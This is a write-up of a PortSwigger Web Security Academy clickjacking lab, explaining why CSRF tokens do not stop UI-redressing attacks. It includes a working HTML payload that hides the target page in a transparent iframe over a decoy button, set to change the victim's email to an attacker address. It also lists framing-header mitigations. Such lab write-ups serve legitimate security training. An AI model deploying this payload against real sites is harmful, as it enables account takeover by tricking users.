# Basic Clickjacking with CSRF Token Protection

> 📚 **Category:** Clickjacking
> 🎯 **Difficulty:** Apprentice
> 🛡️ **Platform:** PortSwigger Web Security Academy
> ✅ **Status:** Completed

---

# Overview

This lab demonstrates that **CSRF protection alone is not sufficient to prevent clickjacking attacks**. Although the application correctly validates CSRF tokens, it still allows its pages to be embedded inside an iframe. An attacker can exploit this by overlaying the legitimate page beneath deceptive content, tricking users into performing actions they never intended.

---

# Lab Objective

Exploit the clickjacking vulnerability to perform an unauthorized action while the application is protected with CSRF tokens.

---

# Understanding the Vulnerability

Clickjacking is a **UI Redressing** attack where a legitimate webpage is embedded inside an invisible or transparent iframe on a malicious website.

When the victim clicks what appears to be a harmless button, they are actually interacting with elements inside the hidden iframe.

Since the interaction occurs on the legitimate application:

* The user remains authenticated.
* Session cookies are sent automatically.
* Valid CSRF tokens are submitted with the request.

As a result, the server processes the request as if it were intentionally performed by the legitimate user.

---

# Solution Walkthrough

## Step 1 — Identify the Vulnerability

The application could be loaded inside an iframe because it did not implement proper clickjacking protections such as:

* `X-Frame-Options`
* `Content-Security-Policy: frame-ancestors`

---

## Step 2 — Create a Clickjacking Page

A malicious webpage was created that embeds the vulnerable page inside an almost invisible iframe.

The iframe was carefully positioned so that clicking the visible **"Click Me"** button would actually trigger the sensitive button inside the embedded application.

---

## Exploit Code

```html
<style>
    iframe {
        position: relative;
        width: 1500px;
        height: 1000px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 530px;
        left: 250px;
        z-index: 1;
    }
</style>

<div>Click Me</div>

<iframe src="https://LAB-URL/my-account?email=hacker@attacker-website.com"></iframe>
```

> **Note:** The original lab-specific URL has been replaced with a generic placeholder (`https://LAB-URL/...`) since PortSwigger lab URLs are unique to each session. The exploit structure remains unchanged.

---

# Code Breakdown

### `opacity: 0.0001`

Makes the iframe almost completely invisible while still allowing mouse interactions.

### `z-index`

Places the iframe above the visible page so clicks are received by the hidden application.

### `position`

Allows precise alignment between the fake button and the real button underneath.

### Fake Button

The visible **"Click Me"** text acts as a decoy to convince the victim to click.

### Embedded Application

The iframe loads the vulnerable page where the user's click performs the sensitive action.

---

# Why the Attack Works

CSRF protection verifies that requests contain a valid token, but it **does not verify whether the user's interaction was genuine**.

Clickjacking manipulates the browser's user interface instead of forging HTTP requests. Since the victim interacts with the legitimate application through the hidden iframe, the browser automatically includes all required authentication information, allowing the request to succeed.

---

# Real-World Impact

If exploited against a production application, clickjacking could allow an attacker to trick users into:

* Changing account settings
* Updating email addresses
* Granting application permissions
* Performing financial transactions
* Executing administrative actions

---

# Mitigation

Developers should implement multiple layers of protection:

* `X-Frame-Options: DENY`
* `X-Frame-Options: SAMEORIGIN`
* `Content-Security-Policy: frame-ancestors`
* Confirmation prompts for sensitive actions
* Additional interaction validation for high-risk operations

---

# Key Takeaways

* CSRF tokens do not prevent clickjacking attacks.
* Clickjacking exploits user interaction rather than request forgery.
* Proper frame restrictions are essential for preventing UI redressing attacks.
* Browser security headers play a critical role in defending against iframe-based attacks.

---

# References

* PortSwigger Web Security Academy
* OWASP Clickjacking Defense Cheat Sheet

---

> **Disclaimer:** This write-up documents a lab completed in the PortSwigger Web Security Academy for educational purposes. All testing was performed in an authorized training environment.
